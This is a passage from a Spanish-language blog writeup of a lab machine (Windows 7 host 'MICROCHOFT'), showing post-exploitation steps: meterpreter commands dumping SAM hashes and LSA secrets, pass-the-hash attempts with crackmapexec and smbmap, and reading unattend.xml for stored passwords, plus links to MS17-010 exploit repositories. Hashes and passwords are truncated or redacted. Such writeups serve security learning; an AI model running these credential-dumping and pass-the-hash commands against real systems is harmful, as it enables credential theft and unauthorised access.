+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>       <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>     <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>microchoft$  WORKGROUP  <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>No obtuvimos nada.</p>
+<ul>
+<li>Veamos si podemos obtener los <strong>hashes NTLM</strong> con el comando <code>lsa_dump_sam</code>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; lsa_dump_sam
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Running as SYSTEM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping SAM
+</span></span><span style="display:flex;"><span>Domain : MICROCHOFT
+</span></span><span style="display:flex;"><span>SysKey : 50eed915eff2e2089c21f2fbdc7a5bb4
+</span></span><span style="display:flex;"><span>Local SID : S-1-5-21-241196597-1966138111-2498293481
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SAMKey : 7e4d05b4047b0193db824b57575c8e32
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>RID  : 000001f4 <span style="color:#f92672">(</span>500<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>User : Administrator
+</span></span><span style="display:flex;"><span>  Hash NTLM: f8d3f...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>RID  : 000001f5 <span style="color:#f92672">(</span>501<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>User : Guest
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>RID  : 000003e8 <span style="color:#f92672">(</span>1000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>User : Admin
+</span></span><span style="display:flex;"><span>  Hash NTLM: f8d3f...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>RID  : 000003e9 <span style="color:#f92672">(</span>1001<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>User : Lola
+</span></span><span style="display:flex;"><span>  Hash NTLM: f8d3f...
+</span></span></code></pre></div><p>Me parece extraño que sea el mismo Hash para todos los usuarios.</p>
+<ul>
+<li>Veamos si podemos obtener alguna contraseña en texto claro con el comando <code>lsa_dump_secrets</code>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; lsa_dump_secrets
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Running as SYSTEM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping LSA secrets
+</span></span><span style="display:flex;"><span>Domain : MICROCHOFT
+</span></span><span style="display:flex;"><span>SysKey : 50eed...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Local name : MICROCHOFT <span style="color:#f92672">(</span> S-1-5-21-.... <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Domain name : WORKGROUP
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Policy subsystem is : 1.11
+</span></span><span style="display:flex;"><span>LSA Key<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> : 1, default <span style="color:#f92672">{</span>c1a9...<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>00<span style="color:#f92672">]</span> <span style="color:#f92672">{</span>c1a9...<span style="color:#f92672">}</span> b20e29...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Secret  : DefaultPassword
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Secret  : DPAPI_SYSTEM
+</span></span><span style="display:flex;"><span>cur/hex : <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> d9 <span style="color:#ae81ff">47</span> 4d <span style="color:#ae81ff">75</span> ...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Comprobemos el <strong>Hash NTLM</strong> con los usuarios mostrados con <strong>crackmapexec</strong>, para ver si alguno es válido:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb 192.168.1.10 -u <span style="color:#e6db74">&#39;Administrator&#39;</span> -H <span style="color:#e6db74">&#39;f8d3f...&#39;</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.1.10 <span style="color:#ae81ff">445</span>    MICROCHOFT       <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">7</span> Home Basic <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span> x64 <span style="color:#f92672">(</span>name:MICROCHOFT<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:Microchoft<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.1.10 <span style="color:#ae81ff">445</span>    MICROCHOFT       <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Microchoft<span style="color:#ae81ff">\A</span>dministrator:f8d3f... STATUS_ACCOUNT_DISABLED 
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>crackmapexec smb 192.168.1.10 -u <span style="color:#e6db74">&#39;Admin&#39;</span> -H <span style="color:#e6db74">&#39;f8d3f...&#39;</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.1.10 <span style="color:#ae81ff">445</span>    MICROCHOFT       <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">7</span> Home Basic <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span> x64 <span style="color:#f92672">(</span>name:MICROCHOFT<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:Microchoft<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.1.10 <span style="color:#ae81ff">445</span>    MICROCHOFT       <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Microchoft<span style="color:#ae81ff">\A</span>dmin:f8d3f... STATUS_PASSWORD_EXPIRED
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>crackmapexec smb 192.168.1.10 -u <span style="color:#e6db74">&#39;Lola&#39;</span> -H <span style="color:#e6db74">&#39;f8d3f...&#39;</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.1.10 <span style="color:#ae81ff">445</span>    MICROCHOFT       <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">7</span> Home Basic <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span> x64 <span style="color:#f92672">(</span>name:MICROCHOFT<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:Microchoft<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.1.10 <span style="color:#ae81ff">445</span>    MICROCHOFT       <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Microchoft<span style="color:#ae81ff">\L</span>ola:f8d3f...
+</span></span></code></pre></div><p>Parece que solamente funciona con el <strong>usuario Lola</strong>.</p>
+<p>Comprobémoslo con <strong>smbmap</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbmap -u <span style="color:#e6db74">&#39;Lola&#39;</span> -p <span style="color:#e6db74">&#39;f8d3f...&#39;</span> -H 192.168.1.10
+</span></span><span style="display:flex;"><span>    ________  ___      ___  _______   ___      ___       __         _______
+</span></span><span style="display:flex;"><span>   /<span style="color:#e6db74">&#34;       )|&#34;</span>  <span style="color:#ae81ff">\ </span>   /<span style="color:#e6db74">&#34;  ||   _  &#34;</span><span style="color:#ae81ff">\ </span>|<span style="color:#e6db74">&#34;  \    /&#34;</span>  |     /<span style="color:#e6db74">&#34;&#34;</span><span style="color:#ae81ff">\ </span>      |   __ <span style="color:#e6db74">&#34;\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#39; /\  \     |:  ____/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#39;  \    (|  /
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   /&#34;</span> <span style="color:#ae81ff">\ </span>  :<span style="color:#f92672">)</span> |.  <span style="color:#ae81ff">\ </span>   /:  <span style="color:#f92672">||</span>: |_<span style="color:#f92672">)</span>  :<span style="color:#f92672">)</span>|.  <span style="color:#ae81ff">\ </span>   /:  | /   /  <span style="color:#ae81ff">\ </span>  <span style="color:#ae81ff">\ </span> /|__/ <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  <span style="color:#f92672">(</span>_______/  |___|<span style="color:#ae81ff">\_</span>_/|___|<span style="color:#f92672">(</span>_______/ |___|<span style="color:#ae81ff">\_</span>_/|___|<span style="color:#f92672">(</span>___/    <span style="color:#ae81ff">\_</span>__<span style="color:#f92672">)(</span>_______<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|---|---|---|---|---|---|---|---|---|
+</span></span><span style="display:flex;"><span>SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
+</span></span><span style="display:flex;"><span>                     https://github.com/ShawnDEvans/smbmap
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Detected <span style="color:#ae81ff">1</span> hosts serving SMB                                                                                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Established <span style="color:#ae81ff">1</span> SMB connections<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> and <span style="color:#ae81ff">0</span> authenticated session<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>                                                          
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed <span style="color:#ae81ff">1</span> connections
+</span></span></code></pre></div><p>No mostró nada, por lo que este hash no sirve para nada.</p>
+<h3 id="Unattend">Buscando y Leyendo Archivo Unattend.xml</h3>
+<p>¿Qué es el archivo <strong>Unattend.xml</strong>?</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Archivo Unattend.xml</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>unattend.xml es un archivo de configuración utilizado en sistemas operativos Windows para automatizar el proceso de instalación y configuración de Windows, también conocido como una instalación desatendida. Este archivo es comúnmente empleado en entornos corporativos o en despliegues masivos para estandarizar configuraciones y ahorrar tiempo al eliminar la necesidad de intervención manual durante la instalación.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Resulta que en este archivo, es posible que podamos encontrar la contraseña en texto claro o cifrada en <strong>base64</strong> de algún usuario.</p>
+<p>Podemos buscar este archivo desde el <strong>meterpreter</strong> con el comando <strong>search</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; search -f Unattend.xml
+</span></span><span style="display:flex;"><span>Found <span style="color:#ae81ff">1</span> result...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Path                             Size <span style="color:#f92672">(</span>bytes<span style="color:#f92672">)</span>  Modified <span style="color:#f92672">(</span>UTC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>----                             ------------  --------------
+</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\P</span>anther<span style="color:#ae81ff">\u</span>nattend.xml  <span style="color:#ae81ff">9658</span>          2024-03-28 10:35:48 -0600
+</span></span></code></pre></div><p>Obtuvimos la ruta.</p>
+<p>Para que puedas leer el archivo, debes abrir una shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>meterpreter &gt; shell
+</span></span><span style="display:flex;"><span>.Process 1828 created.
+</span></span><span style="display:flex;"><span>Channel 3 created.
+</span></span><span style="display:flex;"><span>Microsoft Windows [Version 6.1.7601]
+</span></span><span style="display:flex;"><span>Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:\Users\Admin\Desktop<span style="color:#75715e">&gt;</span>
+</span></span><span style="display:flex;"><span>C:\Users\Admin\Desktop<span style="color:#75715e">&gt;cd C:\Windows\Panther\</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">cd</span> C:\Windows\Panther\
+</span></span><span style="display:flex;"><span>C:\Windows\Panther<span style="color:#75715e">&gt;type unattend.xml</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">type</span> unattend.xml
+</span></span><span style="display:flex;"><span>&lt;?xml version=&#39;1.0&#39; encoding=&#39;utf-8&#39;?&gt;
+</span></span><span style="display:flex;"><span>&lt;unattend xmlns=<span style="color:#e6db74">&#34;urn:schemas-microsoft-com:unattend&#34;</span> xmlns:wcm=<span style="color:#e6db74">&#34;http://schemas.microsoft.com/WMIConfig/2002/State&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    &lt;settings pass=<span style="color:#e6db74">&#34;windowsPE&#34;</span> wasPassProcessed=<span style="color:#e6db74">&#34;true&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>    &lt;settings pass=<span style="color:#e6db74">&#34;oobeSystem&#34;</span> wasPassProcessed=<span style="color:#e6db74">&#34;true&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;component name=<span style="color:#e6db74">&#34;Microsoft-Windows-Shell-Setup&#34;</span> processorArchitecture=<span style="color:#e6db74">&#34;amd64&#34;</span> publicKeyToken=<span style="color:#e6db74">&#34;31bf3856ad364e35&#34;</span> language=<span style="color:#e6db74">&#34;neutral&#34;</span> versionScope=<span style="color:#e6db74">&#34;nonSxS&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>            &lt;AutoLogon&gt;
+</span></span><span style="display:flex;"><span>                &lt;Password&gt;*SENSITIVE*DATA*DELETED*&lt;/Password&gt;
+</span></span><span style="display:flex;"><span>                &lt;Enabled&gt;true&lt;/Enabled&gt;
+</span></span><span style="display:flex;"><span>                &lt;Username&gt;Admin&lt;/Username&gt;
+</span></span><span style="display:flex;"><span>            &lt;/AutoLogon&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            &lt;UserAccounts&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                &lt;AdministratorPassword&gt;*SENSITIVE*DATA*DELETED*&lt;/AdministratorPassword&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                &lt;LocalAccounts&gt;
+</span></span><span style="display:flex;"><span>                    &lt;LocalAccount wcm:action=<span style="color:#e6db74">&#34;add&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>                        &lt;Name&gt;Admin&lt;/Name&gt;
+</span></span><span style="display:flex;"><span>                        &lt;DisplayName&gt;Admin&lt;/DisplayName&gt;
+</span></span><span style="display:flex;"><span>                        &lt;Group&gt;administrators;users&lt;/Group&gt;
+</span></span><span style="display:flex;"><span>                        &lt;Password&gt;*SENSITIVE*DATA*DELETED*&lt;/Password&gt;
+</span></span><span style="display:flex;"><span>                    &lt;/LocalAccount&gt;
+</span></span><span style="display:flex;"><span>                &lt;/LocalAccounts&gt;
+</span></span></code></pre></div><p>Parece que estaba la contraseña del <strong>usuario Admin</strong>, pero fue eliminada de este archivo.</p>
+<p>Sin embargo, es una buena opción que podemos buscar para poder escalar privilegios.</p>
+
+
+    
+    <h2 id="links-de-investigacion">Links de investigación</h2>
+    <ul>
+      <li><a href="https://github.com/worawit/MS17-010" target="_blank" rel="noopener noreferrer">https://github.com/worawit/MS17-010</a></li><li><a href="https://github.com/3ndG4me/AutoBlue-MS17-010" target="_blank" rel="noopener noreferrer">https://github.com/3ndG4me/AutoBlue-MS17-010</a></li><li><a href="https://github.com/totekuh/eternalblue" target="_blank" rel="noopener noreferrer">https://github.com/totekuh/eternalblue</a></li><li><a href="https://github.com/AnikateSawhney/Pwning_Blue_From_HTB_Without_Metasploit" target="_blank" rel="noopener noreferrer">https://github.com/AnikateSawhney/Pwning_Blue_From_HTB_Without_Metasploit</a></li><li><a href="https://abhishekgk.medium.com/solution-impacket-error-ms17-010-a7787ebacf84" target="_blank" rel="noopener noreferrer">https://abhishekgk.medium.com/solution-impacket-error-ms17-010-a7787ebacf84</a></li><li><a href="https://github.com/palantir/python-language-server/issues/370" target="_blank" rel="noopener noreferrer">https://github.com/palantir/python-language-server/issues/370</a></li><li><a href="https://stackoverflow.com/questions/40368431/unable-to-install-pyopenssl-python27" target="_blank" rel="noopener noreferrer">https://stackoverflow.com/questions/40368431/unable-to-install-pyopenssl-python27</a></li><li><a href="https://github.com/fortra/impacket/releases" target="_blank" rel="noopener noreferrer">https://github.com/fortra/impacket/releases</a></li>
+    </ul>
+    
+  </div>
+
+  
+
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+<nav class="post-nav">
+  
+  <a class="post-nav-link post-nav-prev" href="http://localhost:1313/vulnhub-wirteup-fawkes/">
+    <span class="post-nav-label">← Anterior</span>
+    <span class="post-nav-title">Fawkes - VulnHub</span>
+  </a>
+  
+  
+  <a class="post-nav-link post-nav-next" href="http://localhost:1313/THL-writeup-ensalaPapas/">
+    <span class="post-nav-label">Siguiente →</span>
+    <span class="post-nav-title">Ensalá Papas  - TheHackerLabs</span>
+  </a>
+  
+</nav>
+
+
+
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="wrap">
+    <p>&copy; 2026 BerserkWings · México
+       · <a href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </p>
+  </div>
+</footer>
+
+  
+
+
+<a href="#indice" class="back-to-top" id="backToTop" aria-label="Volver al índice">&uarr;</a>
+
+
+<script src="/js/main.min.15ff80349759f71df793ae28568ef0a6a9c3eb6efe99c9e96bad1d9236a26c31.js" integrity="sha256-Ff&#43;ANJdZ9x33k64oVo7wpqnD627&#43;mcnpa60dkjaibDE=" defer></script>
+
+</body>
+</html>
